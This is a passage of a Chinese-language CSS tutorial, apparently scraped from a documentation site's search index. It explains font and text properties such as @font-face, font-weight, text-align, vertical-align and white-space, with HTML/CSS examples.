margin-left: 0;\n        writing-mode: vertical-lr;\n    }\n    .cl1 { text-orientation: mixed; }\n    .cl2 { text-orientation: upright; }\n    .cl3 { text-orientation: sideways; }\n    div.labels { clear: left; display: flex; }\n    div.labels h6 {\n        display: inline-block;\n        width: 11rem;\n        text-align: center;\n        height: auto;\n        margin-top: 0.5em;\n        margin-right: 2em;\n    }\n    </style>\n</head>\n<body>\n    <div class="arena">\n        <p>This is a paragraph of <span lang="zh">中文</span> and English text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl1">This is a paragraph of <span lang="zh">中文</span> and English text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl2">This is a paragraph of <span lang="zh">中文</span> and English text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <p class="cl3">This is a paragraph of <span lang="zh">中文</span> and English text, largely unstyled. <span lang="jp">今天天气不错。</span></p>\n        <div class="labels">\n            <h6>mixed</h6>\n            <h6>upright</h6>\n            <h6>sideways</h6>\n        </div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# 2.10.3 direction\n\n在以前可以通过改变内联基线方向来影响文本的方向，也就是direction属性和unicode-bidi属性，我们不建议使用它们，因为你可能稍不注意就改变了页面其他地方的显示效果，这两个属性是浏览器文档设计者专用的，我们web开发人员了解一下就好。\n\n不建议使用的原因还有一个，html有个dir决定元素方向，而css的direction的效果和它一样并且会覆盖html的dir效果，建议是使用html的dir而不是css的direction。\n\ndirection属性有两个值，ltr表示从左到右的方向，这是书写模式下默认的方向（英文等），另一个是与之相反的rtl从右到左。这个属性会影响到块级元素内部文本的方向、表格列的布局、溢出方向等等。',normalizedContent:'# 字体与文本属性\n\n\n# 一、字体\n\n\n# 1.1 使用字体\n\ncss有5种通用家族字体（泛型字体）：\n\n名称           定义\nserif        有衬线的字体 （衬线一词是指字体笔画尾端的小装饰，存在于某些印刷体字体中）\nsans-serif   没有衬线的字体\nmonospace    每个字符具有相同宽度的字体，通常用于代码列表。\ncursive      用于模拟笔迹的字体，具有流动的连接笔画。\nfantasy      用来装饰的字体\n\n客户端中常见的网页安全字体：\n\n字体名称              泛型           注意\narial             sans-serif   通常认为最佳做法还是添加 helvetica 作为 arial 的首选替代品，尽管它们的字体面几乎相同，但\n                               helvetica 被认为具有更好的形状，即使arial更广泛地可用。\ncourier new       monospace    某些操作系统有一个 courier new 字体的替代（可能较旧的）版本叫courier。使用courier\n                               new作为courier的首选替代方案，被认为是最佳做法。\ngeorgia           serif        \ntimes new roman   serif        某些操作系统有一个 times new roman 字体的替代（可能较旧的）版本叫\n                               times。使用times作为times new roman的首选替代方案，被认为是最佳做法。\ntrebuchet ms      sans-serif   您应该小心使用这种字体——它在移动操作系统上并不广泛。\nverdana           sans-serif   \n\n调用字体是使用font-family，例如\n\nbody {font-family: serif;} /*正个页面的文字使用衬线字体*/\nh1, h2, h3, h4 {font-family: sans-serif;} /*标题使用非衬线字体*/\ncode, pre, tt, kbd {font-family: monospace;} /*代码块等其他地方使用等宽字体*/\np.signature {font-family: cursive;} /*某个特殊的段落使用仿笔迹字体*/\n\n\n1\n2\n3\n4\n\n\n\n\n建议font-family使用字体栈，也就是多个值使用,来分隔，当第一个字体无法被解析时会对下一个字体进行解析。\n\nh1 { font-family: arial, sans-serif; }\nh2 { font-family: charcoal, sans-serif; }\np { font-family: "times new roman", serif; }\naddress { font-family: chicago, sans-serif; }\n\n\n1\n2\n3\n4\n\n\n字体如果名称比较特殊或者它带的关键字与其他字体冲突，那么可以将字体使用\'\'或者""来包裹起来。\n\np { font-family: times, "times new roman", "new century schoolbook", georgia, "new york", serif; }\nh2 { font-family: wedgie, "karrank%", klingon, fantasy; }\nh3 { font-family: author, "cursive", cursive; }\n\n\n1\n2\n3\n\n\n\n# 1.2 @font-face\n\n在css里使用字体时，该字体是需要存在于客户端（浏览器）里的，而客户端一般只安装了被广泛使用的一些字体。如果我们想使用自定义字体或者还在小范围流行的字体，可以通过webfont功能来从服务器下载该字体。\n\n具体使用的是@font-face，它最常用的两个描述符font-family和src，其中font-family是用来定义下载字体的名字，src是字体下载源（可以是多个，用逗号分隔），src中还可以使用format()用来显式地声明字体文件格式，不支持的格式可以直接跳过节约宽带。\n\n@font-face {\n    font-family: webfont;                                       /*定义字体名称*/\n    src: url(\'font/fontin_sans_r_45b.otf\') format("opentype");  /*字体下载url*/\n}\nh1 { font-family: webfont; } /*使用该字体*/\n\n\n1\n2\n3\n4\n5\n\n\n在一些场景里需要使用类似斜体、粗体和压缩字体，那么先在服务器里准备好斜体和粗体的字体，然后在@font-face里添加font-style: italic、font-weight: bold或font-stretch: condensed，不是都写在一个@font-face里的，是有哪些字体就对应写上几个@font-face。\n\n@font-face {\n    font-family: webfont;\n    src: url(\'fontin_sans_r_45b.otf\') format("opentype");  /*正常字体*/\n}\n@font-face {\n    font-family: webfont;\n    font-style: italic;\n    src: url(\'fontin_sans_i_45b.otf\') format("opentype");  /*斜体字体*/\n}\n@font-face {\n    font-family: webfont;\n    font-weight: bold;\n    src: url(\'fontin_sans_b_45b.otf\') format("opentype");  /*粗体字体*/\n}\n@font-face {\n    font-family: webfont;\n    font-style: italic;\n    font-weight: bold;\n    src: url(\'fontin_sans_bi_45b.otf\') format("opentype");  /*粗斜体字体*/\n}\n@font-face {\n    font-family: webfont;\n    font-style: italic;\n    font-stretch: condensed\n    src: url(\'fontin_sans_ic_45b.otf\') format("opentype");  /*斜体压缩字体*/\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n也可以采用先客户端后服务端，客户端的使用是将src:url()改为src:local()\n\n@font-face {\n    font-family: webfont;\n    src: local("helvetica neue"), url(\'mgopenmodernaregular.ttf\');  /*先在客户端查找，找不到再去服务端查找*/\n}\n\n\n1\n2\n3\n4\n\n\n\n# 1.3 字体粗细\n\n一般来说，字体的粗细越粗，文字的颜色就越深。font-weight就是用来描述字体的粗细的，它的值有：\n\n * normal：默认，该标准字体的默认粗度。\n * bold：粗体。\n * bolder：更粗。\n * lighter：更细。\n * 100 | 200 | 300 | 400 | 500 | 600 | 700 | 800 | 900：100最细900最粗，400对应normal，700对应bold。\n\n其实100到900可能并没有一一对应（映射）到真实的粗细字体：\n\n * 如果500没有映射值，它将被赋予和400相同粗细的字体。\n * 如果300没有映射值，它将被赋予比400更细的下一个字体。但是如果没有更细的字体可用，那300被赋予和400相同粗细的字体。此方法也同样适用于200和100。\n * 如果600没有映射值，它将被赋予比500更粗的下一个字体。但是如果没有更粗的字体可用，那600被赋予和500相同粗细的字体。此方法也同样适用于700、800和900。\n\nbolder和lighter在使用时有个比较坑的点，它是在继承到的font-weight基础上更粗或者更细，也就是说它是一个相对值。比如父级是100，那子级使用bolder的话就可能会是normal或者bold。可以看下面这个例子：\n\n<html>\n<head>\n    <style type="text/css">\n    p { font-weight: normal; }\n    p em { font-weight: bolder; }  /* 假设粗体字体存在，那这个em就是\'bold\' */\n    h1 { font-weight: bold; } /* 假设粗体字体存在，那此时\'bold\'对应700 */\n    h1 b { font-weight: bolder; }  /* 更粗的字体也存在的话，那这个b是\'800\' */\n    div { font-weight: 100; } /* 假设更细的字体存在，100会有映射值，那使用bolder会是\'normal\'。*/\n    div strong { font-weight: bolder; } /* 不存在的话，100会映射到\'normal\'，那使用bolder就会是\'bold\'  */\n    </style>\n</head>\n<body>\n    <p class="one">within this paragraph we find some <em>emphasized text</em>.</p>\n    <h1>this h1 contains <b>bold text!</b></h1>\n    <div>meanwhile, this div element has some <strong>strong text</strong> but it shouldn’t look much different, at least in terms of font weight.</div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n如果你怕100到900映射不到值，可以在下载字体时不使用normal和bold，而是使用100到900这9个值：\n\n@font-face {\n  font-family: "switzeraadf";\n  font-weight: 300;\n  src: url("f/switzeraadf-light.otf") format("opentype");\n}\n@font-face {\n  font-family: "switzeraadf";\n  font-weight: 500;\n  src: url("f/switzeraadf-demibold.otf") format("opentype");\n}\n@font-face {\n  font-family: "switzeraadf";\n  font-weight: 700;\n  src: url("f/switzeraadf-bold.otf") format("opentype");\n}\n@font-face {\n  font-family: "switzeraadf";\n  font-weight: 900;\n  src: url("f/switzeraadf-extrabold.otf") format("opentype");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 1.4 字体大小\n\n字体大小使用font-size这个属性，这个属性的值有xx-small | x-small | small | medium | large | x-large | xx-large | smaller | larger | <length> | <percentage>。\n\n<html>\n<head>\n    <style type="text/css">\n    p.one { font-size: xx-small }\n    p.two { font-size: x-small; }\n    p.three { font-size: small; }\n    p.four { font-size: medium; }\n    p.five { font-size: large; }\n    p.six { font-size: x-large; }\n    p.seven { font-size: xx-large; }\n    </style>\n</head>\n<body>\n    <p class="one">this paragraph (class \'one\') has a font size of \'xx-small\'.</p>\n    <p class="two">this paragraph (class \'two\') has a font size of \'x-small\'.</p>\n    <p class="three">this paragraph (class \'three\') has a font size of \'small\'.</p>\n    <p class="four">this paragraph (class \'four\') has a font size of \'medium\'.</p>\n    <p class="five">this paragraph (class \'five\') has a font size of \'large\'.</p>\n    <p class="six">this paragraph (class \'six\') has a font size of \'x-large\'.</p>\n    <p class="seven">this paragraph (class \'seven\') has a font size of \'xx-large\'.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nsmaller和larger是更小和更大，是在一个继承到的字体大小基础上除以或者乘以一个放大系数，这个放大系数在css1的时候是1.5，现在css3是个比较复杂的比率。\n\n<percentage>就是使用百分比了，是相对于父元素字体大小的百分比。\n\n<length>就是使用长度单位的大小了，例子如下：\n\n<html>\n<head>\n    <style type="text/css">\n    p { line-height: 1; margin: 0.5em; }\n    p.one { font-size: 36pt; }\n    p.two { font-size: 3pc; }\n    p.three { font-size: 0.5in; }\n    p.four { font-size: 1.27cm; }\n    p.five{ font-size: 12.7mm; }\n    </style>\n</head>\n<body>\n    <p class="one">36 point font size</p>\n    <p class="two">3 pica font size</p>\n    <p class="three">0.5 inch font size</p>\n    <p class="four">1.27 centimeter font size</p>\n    <p class="five">12.7 millimeter font size</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n最常用的长度单位：\n\n * px: 像素，相对于显示器屏幕分辨率而言的。这是一个绝对单位，它导致了在任何情况下，页面上的文本所计算出来的像素值都是一样的。\n * em: 1em 等于我们设计的当前元素的父元素上设置的字体大小。大多数浏览器的默认字体是16px，那么一开始1em等于16px，但这样的换算很麻烦，所以在html或者body选择器中声明了font-size: 62.5%，那么1em就等于10px，在对旧项目使用em时就很方便的对px除以10就可以得到新的em了。\n * rem: 这个单位的效果和 em 差不多，除了 1rem 等于 html 中的根元素的字体大小 ，而不是父元素。这可以让你更容易计算字体大小，但是遗憾的是， rem 不支持 internet explorer 8 和以下的版本。\n\n字体替换问题：\n\nfont-size-adjust设置的值是字体的aspect（比例值），aspect是“该字体的x高度”除以“该字体尺寸”。如果页面某个局部需要使用新字体，但需要新旧字体的展示大小一样（以免影响内容大小或布局）。那么就可以通过font-size-adjust和font-size来调整新字体最终展示效果，也就是让替换前后的小写字母x展示效果一样。\n\n推导过程，x展示效果要一样，那么可得到这样一个等式：替换后字体大小 * 替换后的aspect = 替换前的字体大小 * 替换前的aspect。最后就可以得到替换字体后，font-size要设置的新值为替换后字体大小 = 替换前的字体大小 * 替换前的aspect / 替换后的aspect。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            font-family: comic sans ms;\n            font-size: 16px;\n            font-size-adjust: 0.54;\n        }\n        div#div2 {\n            font-family: times new roman;   /*将comic sans ms替换成times new roman*/\n            font-size: 19px;                /* 16 * 0.54 / 0.46 约等于19 */\n            font-size-adjust: 0.46;\n        }\n    </style>\n</head>\n<body>\n    <div id="div1">it is fine today.never change your plans because of the weather.</div>\n    <div id="div2">it is fine today.never change your plans because of the weather.</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 1.5 斜体、字体压缩拉伸\n\nfont-style属性用于设置字体是否斜体，值一般就是三个italic | oblique | normal，italic是最常用的斜体，而oblique是一种比较少用的斜体。oblique的整体倾斜效果没有italic大，oblique就算是倾斜的，它的一部分还是有那种直立的效果（可以通过某种方法将normal处理成oblique）。可以看这下面这个图示：\n\n\n\n如果italic没有映射到真实的斜体，可以使用oblique的版本作为italic来使用，而反过来一般是不行。\n\nfont-stretch属性用于设置字体压缩拉伸的，可能是拉伸的也可能是压缩的，其值normal | ultra-condensed | extra-condensed | condensed | semicondensed | semi-expanded | expanded | extra-expanded | ultraexpanded，这种和字体大小的值用法类似，如果没有映射到真实的值就可能在页面上不起作用。\n\n\n\n\n# 二、文本属性\n\n\n# 2.1 缩进\n\ntext-indent属性设置在块级元素上，会对其内部的文本第一行的开头进行缩进，它的值有<length>和<percentage>两种方式（百分比是相对于父容器宽度）。解释说明：text-indent是设置在块级元素上，或者说是设置在具有块级特性的元素上，然后对其内部具有内联特性的元素进行缩进。如果你不想对块级父容器设置text-indent，但又想让其内部有缩进的效果，那么可以试着使用左外边距margin-left。\n\n<html>\n<head>\n    <style type="text/css">\n    .one { text-indent: 3rem; }\n    .two { text-indent: 3rem; } /* 无效，得设置在块级元素上 */\n    .three { margin-left: 3rem; }\n    </style>\n</head>\n<body>\n    <p class="one">said tommy the cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat.</p>\n    <span class="two">said tommy the cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat. </span><br>\n    <span class="three">said tommy the cat as he reeled back to clear whatever foreign matter may have nestled its way into his mighty throat. </span>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.2 水平对齐\n\ntext-align属性也设置在块级元素上，会对其内部的文本每一行的文字进行水平方向上的对齐，可取值比较多start | end | left | right | center | justify | match-parent。解释说明：text-align设置在具有块级特性的元素上，然后对其内部具有内联特性的元素进行水平对齐。\n\n 1. left和right与书写模式无关，就是于行框的左或者右边进行对齐。\n 2. start和end就取决于书写模式。比如从左到右的顺序，那start跟left是一样的效果，end和right是一样的效果。\n    * start：表示文本对齐到其行框的开始边缘。\n    * end：表示文本对齐到其行框的结束边缘。\n 3. justify是两端对齐，会保证每一行文本显示长度一样，也就说在单词不足的情况下可能会拉伸显示效果。对最后一行无效，justify-all可以让最后一行也强制两端对齐，不过有些浏览器没有实现该功能。\n 4. match-parent和inherit类似，区别在于start和end的值根据父元素的direction确定，并被替换为恰当的left或right。\n\n<html>\n<head>\n    <style type="text/css">\n    .table { width: 700px; display: table; }\n    .row { display: table-row; }\n    .cell {\n        display: table-cell;\n        width: calc(33.33% - 1rem);\n        box-sizing: border-box;\n        margin: .5rem;\n        padding: .5rem;\n        background-color: #fff;\n        overflow: hidden;\n    }\n    p {\n        font: .8rem sans-serif;\n        max-width: 100%;\n        box-sizing: border-box;\n        overflow: hidden;\n        resize: horizontal;\n        background: #e4f0f5;\n        padding: .5rem;\n        margin: .5rem 0 0;\n    }\n    .taleft       { text-align: left;        }\n    .taright      { text-align: right;       }\n    .tacenter     { text-align: center;      }\n    .tajustify    { text-align: justify;     }\n    .tajustifyall { text-align: justify-all; }\n    .tastart      { text-align: start;       }\n    .taend        { text-align: end;         }\n\n    .rtl { direction: rtl; }\n    .ltr { direction: ltr; }\n    </style>\n</head>\n<body>\n    <div class="table">\n        <div class="row">\n            <div class="cell">\n                left\n                <p class="taleft">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                start (ltr)\n                <p class="tastart ltr">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                start (rtl)\n                <p class="tastart rtl">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n        <div class="row">\n            <div class="cell">\n                right\n                <p class="taright">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                end (ltr)\n                <p class="taend ltr">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                end (rtl)\n                <p class="taend rtl">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n        <div class="row">\n            <div class="cell">\n                center\n                <p class="tacenter">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                justify\n                <p class="tajustify">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n            <div class="cell">\n                justify-all\n                <p class="tajustifyall">lorem ipsum dolor sit amet, consectetur adipiscing elit. nam pellen tesque vehicu la con vallis.</p>\n            </div>\n        </div>\n    </div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n\n\n如果想让文本最后一行进行不同于整个文本的对齐方式，那么可以使用text-align-last，它的值有auto | start | end | left | right | center | justify。\n\n\n# 2.3 垂直对齐\n\n# 2.3.1 基线与行高\n\n可以参考前面一章的内容——line-height和baseline\n\n**基线(baseline)**是用于在上面放置字符的一条假象的基准线，像g和p会有下降。基线位置的确定最好还是去看一下前一章的内容。\n\n\n\n**行高(line-height)**主要用于给文字撑出高度用的，最后的值也会作为内联非替换元素的inline box的高度。\n\nline-height取值<number> | <length> | <percentage> | normal。normal是默认值，具体值通常是字体大小的 1.2 倍；<number>是个无单位数值，会乘以该元素的字体大小，与<percentage>差不多；<length>就是最常见的长度值了。不推荐在行高上使用em，因为em是取父级字体大小可能不适用本元素的高度。\n\n# 2.3.2 垂直对齐\n\n可以参考前面一章的内容——vertical-align\n\n垂直对齐使用vertical-align，它是直接设置在内联元素（内联特性）或者单元格上的，也就说你在块级元素上设置vertical-align，其子元素或者内容是没有垂直对齐的。vertical-align的值有baseline | sub | super | top | text-top | middle | bottom | text-bottom | <length> | <percentage>。\n\n * baseline：默认值，让元素的baseline与父元素的baseline进行对齐。\n * middle：中间对齐，让元素的中部与父元素的baseline加上x-height的一半（baseline + x-height / 2）进行对齐。\n * sub：下标基线对齐，让元素的baseline与父元素的下标基线进行对齐。\n * super：上标基线对齐，让元素的baseline与父元素的上标基线进行对齐。\n * text-top：文本框顶部对齐，让元素的inline box顶部与父元素的文本框（单行）顶部进行对齐。\n * text-bottom：文本框底部对齐，让元素的inline box底部与父元素的文本框（单行）底部进行对齐。\n * top：line box顶部对齐，让元素的inline box顶部与当前行的line box顶部进行对齐。\n * bottom：line box底部对齐，让元素的inline box底部与当前行的line box底部进行对齐。\n\n<html>\n<head>\n    <style type="text/css">\n      .outer { background-color: red; }\n      .inner {\n        display: inline-block;\n        width: 100px;\n        height: 100px;\n        background-color: skyblue;\n        /*底部空隙的问题是预留了字符下降的空间与也就是line-height的影响*/\n        /*vertical-align: middle;*/\n      }\n    </style>\n</head>\n<body>\n    <div class="outer">\n        <li class="inner"></li>\n        <li class="inner"></li>\n        <li class="inner"></li>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 500px; }\n    span.raise { vertical-align: super; }\n    span.lower { vertical-align: sub; }\n    </style>\n</head>\n<body>\n    <p>this paragraph contains <span class="raise">superscripted</span>\n    and <span class="lower">subscripted</span>  text.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nvertical-align的另外两种取值:\n\n * <length>使元素的基线对齐到父元素的基线之上的给定长度。可以是负数。\n * <percentage>使元素的基线对齐到父元素的基线之上的给定百分比，该百分比是line-height属性的百分比。可以是负数。\n\n# 2.3.3 单元格的垂直对齐\n\n一般vertical-align都是设置在内联元素上，然后让内容元素相对于它所在的line box容器进行垂直对齐的。但是vertical-align有个特殊场景，就是设置在单元格上，让单元格内容相对于单元格容器进行垂直对齐。\n\n在单元格上设置vertical-align，其值一般是top | bottom | middle | baseline，取这些值会被忽略sub | super | text-top | text-bottom。\n\n<html>\n<head>\n    <style type="text/css">\n    .outer {\n        display: table-cell;\n        /*让单元格里整个内容，相对于单元格这个容器进行一个垂直居中对齐*/\n        vertical-align: middle;\n        width: 280px;\n        height: 200px;\n        border: 1px solid;\n        margin: 0;\n    }\n    .inner1 {\n        display: inline-block;\n        /*让inner1的底部与当前行文本底部对齐*/\n        vertical-align: text-bottom;\n        width: 50px;\n        height: 50px;\n        border: 1px solid blue;\n    }\n    .inner2 {\n        display: inline-block;\n        /*让inner2的中部与当前行“基线加上x一半高度”这个位置进行对齐*/\n        vertical-align: middle;\n        width: 40px;\n        height: 40px;\n        border: 1px solid red;\n    }\n    </style>\n</head>\n<body>\n    <div class="outer">xx\n        <div class="inner1"></div>xx\n        <div class="inner2">xx</div>xx<br>xxxxxxxxxxxxxxxx\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n小节一下：text-align设置在父级块元素，让子级内联元素去对齐。vertical-align设置在子级内联元素，让它本身相对于line box去对齐，特殊情况下设置在父级单元格上，让子级元素（块级和内联都行）去对齐。\n\n\n# 2.4 文本间距\n\n# 2.4.1 词间距\n\nword-spacing属性单词之间的间距的，默认值是normal，可以设置其他长度值（为0跟normal一样的效果）。是对于单词来说的，但是在非英语文本下，无法定义这个“词”是什么，所以它可能会失效\n\n<html>\n<head>\n    <style type="text/css">\n    p.spread { word-spacing: 0.5em; }\n    p.tight { word-spacing: -0.5em; }\n    p.base { word-spacing: normal; }\n    p.norm { word-spacing: 0; }\n    p.text { word-spacing: 0.5em; }\n    </style>\n</head>\n<body>\n    <p class="spread">the spaces between words in this paragraph will be increased by 0.5em.</p>\n    <p class="tight">the spaces between words in this paragraph will be decreased by 0.5em.</p>\n    <p class="base">the spaces between words in this paragraph will be normal.</p>\n    <p class="norm">the spaces between words in this paragraph will be normal.</p>\n    <p class="text">你是谁？</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 2.4.2 字间距\n\n词间距无法影响到字母间的间距，字间距letter-spacing就是来控制字间距的（<length> | normal），其实它也能影响到词间距。\n\n<html>\n<head>\n    <style type="text/css">\n    p { letter-spacing: 0; }    /*  identical to \'normal\'  */\n    p.spacious { letter-spacing: 0.25em; }\n    p.tight { letter-spacing: -0.25em; }\n    </style>\n</head>\n<body>\n    <p>the letters in this paragraph are spaced as normal.</p>\n    <p class="spacious">the letters in this paragraph are spread out a bit.</p>\n    <p class="tight">the letters in this paragraph are smooshed together a bit.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.5 文本大小写\n\ntext-transform属性用于操作文本里单词的大小写，值uppercase是全部大写，lowercase是全部小写，capitalize是首字母小写，none就不设置大小写按照原文来。\n\n<html>\n<head>\n    <style type="text/css">\n    h1 { text-transform: capitalize; }\n    strong { text-transform: uppercase; }\n    p.cummings { text-transform: lowercase; }\n    p.raw { text-transform: none; }\n    </style>\n</head>\n<body>\n    <h1>the heading-one at the beginning</h1>\n    <p>by default, text is displayed in the capitalization it has in the source document, but<strong>it is possible to change this</strong> using the property \'text-transform\'.</p>\n    <p class="cummings">for example, one could create text such as might have been written by the late poet e.e.cummings.</p>\n    <p class="raw">if you feel the need to explicitly declare the transformation of text to be \'none\', that can be done as well.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 2.6 文本修饰\n\ntext-decoration用于对文本进行修饰，也就是加横线的。有这些值：none | [ underline ‖ overline ‖ line-through ‖ blink ]。\n\n * none：关闭了任何可能应用于元素的修饰。用于显示默认的文本或者去掉超链接的下划线。\n * underline：给文本加下划线。\n * overline：给文本加上划线。\n * line-through：给文本加上删除线。\n * blink：将本文显示得忽明忽暗，这个功能浏览器不一定实现了。\n\n可以组合使用，但可能会被覆盖：\n\n<html>\n<head>\n    <style type="text/css">\n    a { text-decoration: none; }\n    a:hover,\n    a:visited {\n      text-decoration: underline overline;\n    }\n    h2.stricken { text-decoration: line-through; }\n    h2 { text-decoration: underline overline; }\n    </style>\n</head>\n<body>\n    <a href="https://www.baidu.com">百度一下</h1>\n    <h2 class="stricken">章节2.1<h2>\n    <h2>章节2.2<h2>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\ntext-decoration会用的问题，如果在父元素里使用它，在子元素里可能屏蔽不了。\n\n<html>\n<head>\n    <style type="text/css">\n    p { text-decoration: underline; color: black; }\n    /* 使用颜色silver，再text-decoration改为underline，能降低子元素的下划线显示 */\n    strong { color: gray; text-decoration: none; }\n    </style>\n</head>\n<body>\n    <p>this paragraph, which is black and has a black underline, also contains<strong>strongly emphasized text</strong> which has the black underline beneath it as well.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 2.7 文本阴影\n\ntext-shadow属性用来给文本加阴影背景的。使用方法：text-shadow: length length length color，值的意思分别是“横方向距离”、“纵方向距离”、“阴影模糊半径”、“阴影颜色”；前两个值为正数时是往右和下偏移，负数就是相反方向；第三个值是阴影所在模糊半径，为0时跟原文字一样，越大就越模糊。\n\n<html>\n<head>\n    <style type="text/css">\n        div {\n            text-shadow: 5px 5px 5px gray;\n            color: navy;\n            font-size: 50px;\n            font-weight: bold;\n            font-family: 宋体;\n        }\n    </style>\n</head>\n<body>\n    <div>你好</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n我们甚至可以给文字设置多个阴影：text-shadow: length length length color,length length length color,length length length color\n\n\n# 2.8 处理文本空白\n\nwhite-space属性用于处理文本里的空白，其值normal | nowrap | pre | pre-wrap | pre-line。\n\n * normal：连续的空白符会被合并，换行符会被当作空白符来处理，满一行（达到父容器宽度）时才会换行。\n * nowrap：与normal大部分一致，唯一的区别就是在满一行（达到父容器宽度）时不会进行换行。\n * pre：连续的空白符会被保留，遇到换行符会换行，满一行（达到父容器宽度）时不会进行换行。\n * pre-wrap：连续的空白符会被保留，遇到换行符会换行（填充line box才会换行)，满一行（达到父容器宽度）时会换行。\n * pre-line：连续的空白符会被合并，遇到换行符会换行（填充line box才会换行)，满一行（达到父容器宽度）时会换行。\n * 可能还会有break-spaces，与pre-wrap的行为相同，除了：\n   * 任何保留的空白序列总是占用空间，包括在行尾。\n   * 每个保留的空格字符后都存在换行机会，包括空格字符之间。\n   * 这样保留的空间占用空间而不会挂起，从而影响盒子的固有尺寸（最小内容大小和最大内容大小）。\n\nwhite-space    空格(含制表符)   换行符   文字满一行   行尾空格\nnormal         合并         合并    换行      删除\nnowrap         合并         合并    不换行     删除\npre            保留         换行    不换行     保留\npre-wrap       保留         换行    换行      挂起\npre-line       合并         换行    换行      删除\nbreak-spaces   保留         换行    换行      换行\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 300px; }\n    /*normal和nowrap效果大部分一致，超过父容器宽度时，normal会换行，nowrap却不会*/\n    p { white-space: nowrap; } /* normal和nowrap替换看效果*/\n    </style>\n</head>\n<body>\n    \x3c!--normal和nowrap，都会让多余的空格进行合并，并且换行符也会被视为空格。超过父容器宽度时就不一样了。--\x3e\n    <p>this paragraph is not allowed to wrap,\n    which means that the only way to end a line is to insert a line-break\n    element.  if no such element is inserted, then the line will go forever,\n    forcing the user to scroll horizontally to read whatever can\'t be\n    initially displayed <br>in the browser window.</p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n<html>\n<head>\n    <style type="text/css">\n    body { width: 100px; }\n    /*多余空白被保留，遇到换行符和<br>进行换行，但是超过父容器宽度时却不会自动换行*/\n    p { white-space: pre; }\n    </style>\n</head>\n<body>\n    <p>this   paragraph   is   not   allowed   to   